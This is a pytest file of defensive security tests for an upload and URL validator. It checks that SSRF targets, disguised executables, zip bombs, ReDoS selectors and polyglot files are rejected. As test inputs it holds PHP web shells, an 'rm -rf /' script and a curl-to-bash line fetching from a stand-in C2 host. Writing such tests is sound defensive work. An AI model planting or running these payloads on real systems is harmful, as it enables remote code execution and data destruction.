# [OMA-W001-T006] STRIDE negative security threat tests

import asyncio
import io
import socket
import zipfile
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest
from PIL import Image

from src.modules.security.exceptions import (
    ERR_CSS_SELECTOR_REDOS_TIMEOUT,
    ERR_MALICIOUS_FILE_TYPE,
    ERR_SSRF_ATTEMPT_BLOCKED,
    ERR_ZIP_BOMB_DETECTED,
    CssSelectorReDosTimeoutError,
    MaliciousFileTypeError,
    SSRFAttemptBlockedError,
    ZipBombDetectedError,
)
from src.modules.security.services.file_validator_service import FileValidatorService
from src.modules.security.services.link_validator_service import LinkValidatorService
from src.modules.security.services.schema_validator_service import (
    SchemaValidatorService,
)


# [OMA-W001-T006] UC-08: Direct SSRF Against AWS Cloud Metadata & Local Loopback
@pytest.mark.asyncio
async def test_ssrf_blocks_imds_and_loopback():
    """UC-08: STRIDE negative test blocking AWS IMDS, link-local, loopback, and private RFC 1918 CIDRs."""
    # Subtest 1: IPv4 AWS IMDS and Link-Local
    imds_ipv4_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/api/token",
        "https://169.254.1.1/secret",
    ]
    for url in imds_ipv4_targets:
        with pytest.raises(SSRFAttemptBlockedError) as exc_info:
            await LinkValidatorService.validate_url(url)
        assert exc_info.value.error_code == ERR_SSRF_ATTEMPT_BLOCKED
        assert "destination" in str(exc_info.value) or "SSRF" in str(exc_info.value)

    # Subtest 2: IPv6 Link-Local and IPv4-mapped IPv6
    imds_ipv6_targets = [
        "http://[fe80::1]/admin",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "http://[fd00:ec2::254]/",
    ]
    for url in imds_ipv6_targets:
        with pytest.raises(SSRFAttemptBlockedError) as exc_info:
            await LinkValidatorService.validate_url(url)
        assert exc_info.value.error_code == ERR_SSRF_ATTEMPT_BLOCKED

    # Subtest 3: Loopback IPv4, IPv6, and Localhost Hostnames
    loopback_targets = [
        "http://127.0.0.1:80/status",
        "http://127.0.0.2:80/admin",
        "http://localhost/metrics",
        "http://[::1]/debug",
        "http://app.localhost/secret",
        "http://service.local/internal",
    ]
    for url in loopback_targets:
        with pytest.raises(SSRFAttemptBlockedError) as exc_info:
            await LinkValidatorService.validate_url(url)
        assert exc_info.value.error_code == ERR_SSRF_ATTEMPT_BLOCKED

    # Subtest 4: Private RFC 1918 and Special CIDRs
    private_cidr_targets = [
        "http://10.0.0.1/db",
        "http://172.16.0.1/internal",
        "http://192.168.1.1/router",
        "http://100.64.0.1/cgnat",
        "http://0.0.0.0/wildcard",
        "http://255.255.255.255/broadcast",
    ]
    for url in private_cidr_targets:
        with pytest.raises(SSRFAttemptBlockedError) as exc_info:
            await LinkValidatorService.validate_url(url)
        assert exc_info.value.error_code == ERR_SSRF_ATTEMPT_BLOCKED

    # Subtest 5: Domain name resolving via DNS to a private IP
    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_loop.getaddrinfo = AsyncMock(
            return_value=[
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.0.0.5", 443))
            ]
        )
        mock_get_loop.return_value = mock_loop

        with pytest.raises(SSRFAttemptBlockedError) as exc_dns:
            await LinkValidatorService.validate_url(
                "https://malicious-dns-rebinding.com"
            )
        assert exc_dns.value.error_code == ERR_SSRF_ATTEMPT_BLOCKED


# [OMA-W001-T006] UC-11: Redirect-Based SSRF Pivot
@pytest.mark.asyncio
async def test_redirect_ssrf_pivot():
    """UC-11: Detects and blocks SSRF pivot attempted via 302 redirect to AWS IMDS or private destination."""
    url = "https://public-host.com/redirect-to-metadata"

    def redirect_pivot_handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/redirect-to-metadata":
            return httpx.Response(
                302, headers={"Location": "http://169.254.169.254/latest/meta-data/"}
            )
        return httpx.Response(200)

    orig_resolve = LinkValidatorService._resolve_host

    async def mock_resolve_host(host: str, port: int) -> str:
        if host == "public-host.com":
            return "93.184.216.34"
        return await orig_resolve(host, port)

    transport = httpx.MockTransport(redirect_pivot_handler)

    with patch.object(
        LinkValidatorService,
        "_resolve_host",
        side_effect=mock_resolve_host,
    ):
        async with httpx.AsyncClient(transport=transport) as client:
            with pytest.raises(SSRFAttemptBlockedError) as exc_info:
                await LinkValidatorService.validate_url(url, client=client)

    assert exc_info.value.error_code == ERR_SSRF_ATTEMPT_BLOCKED
    assert "Blocked SSRF attempt" in str(exc_info.value)


# [OMA-W001-T006] UC-12: Disguised Windows Executable and Dangerous Attachment Rejection
def test_disguised_executable_rejected():
    """UC-12: Inspects magic bytes and rejects disguised PE/ELF binaries, shell scripts, Java class, or HTML."""
    dangerous_signatures = [
        (
            b"MZ\x90\x00\x03\x00\x00\x00",
            "scholarship_guide.pdf",
            "Windows PE executable",
        ),
        (b"\x7fELF\x02\x01\x01\x00", "application_form.pdf", "Linux ELF binary"),
        (b"#!/bin/bash\nrm -rf /", "instructions.docx", "Shell script"),
        (b"\xca\xfe\xba\xbe\x00\x00\x00\x34", "report.xlsx", "Java class binary"),
        (
            b"<!DOCTYPE html><html><script>alert(1)</script></html>",
            "grant.pdf",
            "Disguised HTML",
        ),
        (b"<html xmlns='http://www.w3.org/1999/xhtml'>", "paper.pdf", "Disguised HTML"),
        (
            b"<script type='text/javascript'>malware();</script>",
            "sheet.xlsx",
            "Disguised Script",
        ),
    ]

    for magic_bytes, filename, _description in dangerous_signatures:
        stream = io.BytesIO(magic_bytes + b"\x00" * 100)
        with pytest.raises(MaliciousFileTypeError) as exc_info:
            FileValidatorService.validate_stream(stream, filename=filename)

        assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
        assert "Disallowed executable signature detected" in str(exc_info.value)


# [OMA-W001-T006] UC-13: High-Ratio Zip Bomb Decompression Attack Defense
def test_zip_bomb_rejection():
    """UC-13: Inspects ZIP central directory table without decompression and blocks high-ratio and oversized bombs."""
    # Case A: High compression ratio (> 100:1) with real deflated data
    bomb_buf = io.BytesIO()
    with zipfile.ZipFile(bomb_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # Repeating zeroes compress extremely well (> 500:1 ratio)
        zf.writestr("huge_zeroes.xml", b"0" * (200 * 1024))
    bomb_buf.seek(0)

    with pytest.raises(ZipBombDetectedError) as exc_ratio:
        FileValidatorService.validate_stream(bomb_buf, filename="bomb.zip")

    assert exc_ratio.value.error_code == ERR_ZIP_BOMB_DETECTED
    assert "exceeds 100:1 cap" in str(exc_ratio.value)

    # Case B: Total uncompressed size exceeding 50 MB limit
    mock_large_info = MagicMock()
    mock_large_info.file_size = 55 * 1024 * 1024  # 55 MB
    mock_large_info.compress_size = (
        10 * 1024 * 1024
    )  # 10 MB (ratio 5.5:1, but > 50MB uncompressed)

    with patch("zipfile.ZipFile") as mock_zip_class:
        mock_zip_instance = MagicMock()
        mock_zip_instance.infolist.return_value = [mock_large_info]
        mock_zip_instance.__enter__.return_value = mock_zip_instance
        mock_zip_instance.__exit__.return_value = None
        mock_zip_class.return_value = mock_zip_instance

        with pytest.raises(ZipBombDetectedError) as exc_size:
            FileValidatorService._check_zip_bomb(b"PK\x03\x04fake_zip")

        assert exc_size.value.error_code == ERR_ZIP_BOMB_DETECTED
        assert "exceeds 50 MB limit" in str(exc_size.value)

    # Case C: Zero compressed size with non-zero uncompressed size
    mock_zero_info = MagicMock()
    mock_zero_info.file_size = 5000
    mock_zero_info.compress_size = 0

    with patch("zipfile.ZipFile") as mock_zip_class_2:
        mock_zip_instance_2 = MagicMock()
        mock_zip_instance_2.infolist.return_value = [mock_zero_info]
        mock_zip_instance_2.__enter__.return_value = mock_zip_instance_2
        mock_zip_instance_2.__exit__.return_value = None
        mock_zip_class_2.return_value = mock_zip_instance_2

        with pytest.raises(ZipBombDetectedError) as exc_zero:
            FileValidatorService._check_zip_bomb(b"PK\x03\x04fake_zip")

        assert exc_zero.value.error_code == ERR_ZIP_BOMB_DETECTED
        assert "non-zero uncompressed size with zero compressed size" in str(
            exc_zero.value
        )


# [OMA-W001-T006] UC-14: Pathological CSS Selector Exponential Backtracking (ReDoS) Defense
@pytest.mark.asyncio
async def test_css_selector_redos_timeout():
    """UC-14: Protects against ReDoS backtracking bombs via static complexity linter and dry-run timeout."""
    # Case A: Pathological selector from UC-14 exceeding :has() depth and combinator bounds
    pathological_selector = "div:has(div:has(div:has(div.container))) > * > span:not([class*='a']):not([class*='b'])"
    schema_pathological = {
        "schema_name": "redos_schema",
        "selectors": [pathological_selector, "a.btn-apply"],
    }
    with pytest.raises(CssSelectorReDosTimeoutError) as exc_static:
        await SchemaValidatorService.validate_template_schema(schema_pathological)

    assert exc_static.value.error_code == ERR_CSS_SELECTOR_REDOS_TIMEOUT

    # Case B: Nested :has() depth exceeding 1
    nested_has_selector = "div:has(p:has(span.badge))"
    schema_nested_has = {
        "schema_name": "nested_has",
        "selectors": [nested_has_selector, "h1.title"],
    }
    with pytest.raises(CssSelectorReDosTimeoutError) as exc_has:
        await SchemaValidatorService.validate_template_schema(schema_nested_has)
    assert exc_has.value.error_code == ERR_CSS_SELECTOR_REDOS_TIMEOUT
    assert "exceeds allowed limit of 1" in str(exc_has.value)

    # Case C: Combinators count exceeding 5
    many_combinators = "div > p > span > a > em > b > i"
    schema_many_comb = {
        "schema_name": "many_comb",
        "selectors": [many_combinators, "h1.title"],
    }
    with pytest.raises(CssSelectorReDosTimeoutError) as exc_comb:
        await SchemaValidatorService.validate_template_schema(schema_many_comb)
    assert exc_comb.value.error_code == ERR_CSS_SELECTOR_REDOS_TIMEOUT
    assert "exceeds allowed limit of 5" in str(exc_comb.value)

    # Case D: Dry-run execution timeout simulation (>200ms)
    clean_schema = {
        "schema_name": "clean_schema",
        "selectors": ["h1.title", "a.btn-apply"],
    }
    sample_html = "<html><body><h1 class='title'>Title</h1><a class='btn-apply'>Link</a></body></html>"

    async def mock_wait_for(fut, timeout):
        if asyncio.iscoroutine(fut):
            fut.close()
        raise TimeoutError("Dry-run timed out")

    with patch("asyncio.wait_for", side_effect=mock_wait_for):
        with pytest.raises(CssSelectorReDosTimeoutError) as exc_timeout:
            await SchemaValidatorService.validate_template_schema(
                clean_schema, sample_html=sample_html
            )
        assert exc_timeout.value.error_code == ERR_CSS_SELECTOR_REDOS_TIMEOUT
        assert "timed out (>200ms)" in str(exc_timeout.value)

    # Case E: Dry-run latency exceeding 200ms threshold
    # Note: Pure logical assertion without duration assertion (Constitution Principle VI)
    with patch("time.perf_counter", side_effect=[0.0, 0.250, 0.250, 0.500]):
        with pytest.raises(CssSelectorReDosTimeoutError) as exc_latency:
            await SchemaValidatorService.validate_template_schema(
                clean_schema, sample_html=sample_html
            )
        assert exc_latency.value.error_code == ERR_CSS_SELECTOR_REDOS_TIMEOUT
        assert "exceeded 200ms threshold" in str(exc_latency.value)


# ==============================================================================
# [OMA-W003-T002] File footer and structural integrity unit & threat tests
# ==============================================================================


# [OMA-W003-T002] Threat Test: Polyglot JPEG + PHP injection attack rejected
def test_threat_polyglot_jpeg_php_rejected():
    """Detects and rejects polyglot JPEG+PHP attack concealing PHP execution code in JPEG image."""
    img_buf = io.BytesIO()
    img = Image.new("RGB", (2, 2), color=(0, 255, 0))
    img.save(img_buf, format="JPEG")
    jpeg_bytes = img_buf.getvalue()

    php_payload = b"\n<?php echo shell_exec($_GET['e']); ?>\n"
    polyglot_jpeg = jpeg_bytes + php_payload

    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(polyglot_jpeg), filename="avatar.jpg"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )


# [OMA-W003-T002] Threat Test: Polyglot GIFAR (GIF + JAR executable) rejected
def test_threat_polyglot_gifar_rejected():
    """Detects and rejects GIFAR polyglot attack combining valid GIF header with Java JAR/ZIP payload."""
    img_buf = io.BytesIO()
    img = Image.new("RGB", (2, 2), color=(0, 0, 255))
    img.save(img_buf, format="GIF")
    gif_bytes = img_buf.getvalue()

    jar_buf = io.BytesIO()
    with zipfile.ZipFile(jar_buf, "w") as zf:
        zf.writestr(
            "META-INF/MANIFEST.MF",
            "Manifest-Version: 1.0\nMain-Class: MaliciousExploit\n",
        )
        zf.writestr("MaliciousExploit.class", b"\xca\xfe\xba\xbe" + b"\x00" * 32)
    jar_bytes = jar_buf.getvalue()

    # GIFAR: GIF image bytes followed by complete JAR archive
    gifar_polyglot = gif_bytes + jar_bytes

    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(gifar_polyglot), filename="banner.gif"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )


# [OMA-W003-T002] Threat Test: Polyglot PDF + shell script execution attack rejected
def test_threat_polyglot_pdf_shellscript_rejected():
    """Detects and rejects polyglot PDF + shell script attack appending shell command payload after %%EOF."""
    header = b"%PDF-1.4\n"
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    xref_offset = len(header) + len(obj1) + len(obj2)
    xref = (
        "xref\n"
        "0 3\n"
        "0000000000 65535 f \n"
        f"{len(header):010d} 00000 n \n"
        f"{len(header) + len(obj1):010d} 00000 n \n"
    ).encode("ascii")
    trailer = (
        "trailer\n"
        "<< /Size 3 /Root 1 0 R >>\n"
        "startxref\n"
        f"{xref_offset}\n"
        "%%EOF\n"
    ).encode("ascii")
    pdf_bytes = header + obj1 + obj2 + xref + trailer

    shell_payload = b"\n#!/bin/bash\ncurl -s https://c2.malicious.org/shell.sh | bash\n"
    polyglot_pdf = pdf_bytes + shell_payload

    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(polyglot_pdf), filename="grant_form.pdf"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )


# [OMA-W003-T002] Threat Test: Fake-terminator JPEG bypass attack rejected
def test_threat_fake_terminator_jpeg_webshell_rejected():
    """Detects and rejects fake-terminator bypass embedding PHP webshell terminated by duplicate EOI in JPEG."""
    img_buf = io.BytesIO()
    img = Image.new("RGB", (2, 2), color=(255, 255, 0))
    img.save(img_buf, format="JPEG")
    jpeg_bytes = img_buf.getvalue()

    # Attacker embeds PHP webshell followed by fake terminal \xff\xd9 marker to spoof end-of-image
    php_payload = b"\n<?php echo shell_exec($_GET['cmd']); ?>\n"
    fake_eoi = b"\xff\xd9"
    fake_terminator_jpeg = jpeg_bytes + php_payload + fake_eoi

    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(fake_terminator_jpeg), filename="avatar_bypass.jpg"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )


# [OMA-W003-T002] Threat Test: Fake-terminator PNG duplicate IEND bypass attack rejected
def test_threat_fake_terminator_png_duplicate_iend_rejected():
    """Detects and rejects fake-terminator bypass appending PHP payload and duplicate fake IEND chunk in PNG."""
    img_buf = io.BytesIO()
    img = Image.new("RGB", (2, 2), color=(0, 255, 255))
    img.save(img_buf, format="PNG")
    png_bytes = img_buf.getvalue()

    # Attacker inserts PHP backdoor followed by duplicate 12-byte IEND chunk
    php_backdoor = b"<?php system($_POST['cmd']); ?>"
    fake_iend = b"\x00\x00\x00\x00IEND\xae\x42\x60\x82"
    fake_terminator_png = png_bytes + php_backdoor + fake_iend

    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(fake_terminator_png), filename="badge_bypass.png"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )


# [OMA-W003-T002] Threat Test: Fake-terminator GIF duplicate trailer byte bypass rejected
def test_threat_fake_terminator_gif_duplicate_trailer_rejected():
    """Detects and rejects fake-terminator bypass appending PHP payload terminated by fake trailer byte ';' in GIF."""
    img_buf = io.BytesIO()
    img = Image.new("RGB", (2, 2), color=(128, 0, 128))
    img.save(img_buf, format="GIF")
    gif_bytes = img_buf.getvalue()

    # Attacker inserts PHP backdoor followed by fake trailer byte ';'
    php_backdoor = b"<?php eval($_POST['pwn']); ?>"
    fake_trailer = b";"
    fake_terminator_gif = gif_bytes + php_backdoor + fake_trailer

    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(fake_terminator_gif), filename="banner_bypass.gif"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )


# [OMA-W003-T002] Threat Test: Fake-terminator PDF duplicate %%EOF bypass attack rejected
def test_threat_fake_terminator_pdf_duplicate_eof_rejected():
    """Detects and rejects fake-terminator bypass appending PHP payload with fake startxref and %%EOF in PDF."""
    header = b"%PDF-1.4\n"
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    xref_offset = len(header) + len(obj1) + len(obj2)
    xref = (
        "xref\n"
        "0 3\n"
        "0000000000 65535 f \n"
        f"{len(header):010d} 00000 n \n"
        f"{len(header) + len(obj1):010d} 00000 n \n"
    ).encode("ascii")
    trailer = (
        "trailer\n"
        "<< /Size 3 /Root 1 0 R >>\n"
        "startxref\n"
        f"{xref_offset}\n"
        "%%EOF\n"
    ).encode("ascii")
    pdf_bytes = header + obj1 + obj2 + xref + trailer

    # Attacker inserts PHP payload followed by duplicate fake trailer and %%EOF marker
    fake_pdf_tail = (
        b"\n<?php system($_GET['e']); ?>\n"
        b"xref\n0 1\n0000000000 65535 f \n"
        b"trailer\n<< /Size 1 /Root 1 0 R >>\n"
        b"startxref\n999\n%%EOF\n"
    )
    fake_terminator_pdf = pdf_bytes + fake_pdf_tail

    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(fake_terminator_pdf), filename="grant_bypass.pdf"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )


# [OMA-W003-T002] Threat Test: Fake-EOCD ZIP polyglot attack with embedded webshell rejected
def test_threat_fake_eocd_zip_polyglot_rejected():
    """Detects and rejects ZIP polyglot attack embedding PHP webshell between valid EOCD and fake trailing EOCD record."""
    # Arrange: Build valid ZIP archive
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr(
            "scholarship_manifest.txt",
            "Legitimate scholarship application manifest.",
        )
    valid_zip = zip_buf.getvalue()

    # Attacker embeds PHP backdoor and appends duplicate fake EOCD record to bypass naive footer checks
    php_webshell = b"<?php system($_GET['cmd']); ?>"
    fake_eocd = b"PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    crafted_zip_polyglot = valid_zip + php_webshell + fake_eocd

    # Act & Assert
    with pytest.raises(MaliciousFileTypeError) as exc_info:
        FileValidatorService.validate_stream(
            io.BytesIO(crafted_zip_polyglot), filename="scholarship_manifest.zip"
        )
    assert exc_info.value.error_code == ERR_MALICIOUS_FILE_TYPE
    assert (
        getattr(exc_info.value, "code", exc_info.value.error_code)
        == ERR_MALICIOUS_FILE_TYPE
    )
    assert "File contains trailing injected data or invalid footer" in str(
        exc_info.value
    )
